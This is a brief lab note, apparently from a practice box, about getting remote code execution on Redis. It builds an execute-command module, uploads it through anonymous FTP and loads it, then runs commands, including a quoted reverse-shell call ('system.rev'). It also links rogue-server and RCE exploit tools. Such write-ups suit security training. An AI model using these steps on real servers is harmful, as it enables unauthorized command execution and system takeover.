# Redis

You can exploit **Redis Execute Module** to get the initial foothold. 

[https://github.com/n0b0dyCN/RedisModules-ExecuteCommand.git](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand.git)

For instance, you could load the module in redis and use to to run commands with `system.exec`.

```jsx
┌──(root㉿kali)-[~/pg/practice/sybaris/RedisModules-ExecuteCommand]
└─# make
make -C ./src
make[1]: Entering directory '/root/pg/practice/sybaris/RedisModules-ExecuteCommand/src'
make -C ../rmutil
make[2]: Entering directory '/root/pg/practice/sybaris/RedisModules-ExecuteCommand/rmutil'
gcc -g -fPIC -O3 -std=gnu99 -Wall -Wno-unused-function -I../   -c -o util.o util.c
-- snip -- 

└─# ftp anonymous@192.168.126.93 
Connected to 192.168.126.93.
220 (vsFTPd 3.0.2)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> put ./module.so

└─$ redis-cli -h 192.168.91.93
192.168.91.93:6379> module load /var/ftp/pub/module.so
OK                                        
192.168.91.93:6379> system.exec "id"
"uid=1000(pablo) gid=1000(pablo) groups=1000(pablo)\n"
```

from [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#load-redis-module)

```jsx
127.0.0.1:6379> system.exec "id"
"uid=0(root) gid=0(root) groups=0(root)\n"
127.0.0.1:6379> system.exec "whoami"
"root\n"
127.0.0.1:6379> system.rev 127.0.0.1 9999
```

Can also get code execution through redis Rogue server Redis(<=5.0.5).

[https://github.com/n0b0dyCN/redis-rogue-server.git](https://github.com/n0b0dyCN/redis-rogue-server.git)

Redis 4.x/5.x RCE:

[https://github.com/Ridter/redis-rce.git](https://github.com/Ridter/redis-rce.git)

[6379 - Pentesting Redis](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#redis-rce)